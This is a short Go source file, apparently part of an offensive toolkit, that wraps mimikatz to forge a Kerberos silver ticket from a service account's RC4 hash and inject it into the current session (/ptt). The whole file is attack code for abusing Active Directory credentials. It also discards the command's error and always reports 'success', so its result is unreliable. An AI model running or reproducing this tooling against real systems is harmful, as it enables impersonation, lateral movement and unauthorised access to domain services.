package kerberos

import "os/exec"

type SilverTicketResult struct {
Domain string
User   string
Status string
}

type SilverTicket struct {
Domain  string
User    string
Service string
Hash    string
}

func (s SilverTicket) Forge() SilverTicketResult {
cmd := exec.Command("mimikatz.exe", "kerberos::golden", "/user:"+s.User, "/domain:"+s.Domain, "/service:"+s.Service, "/rc4:"+s.Hash, "/ptt")
cmd.Run()
return SilverTicketResult{Domain: s.Domain, User: s.User, Status: "success"}
}
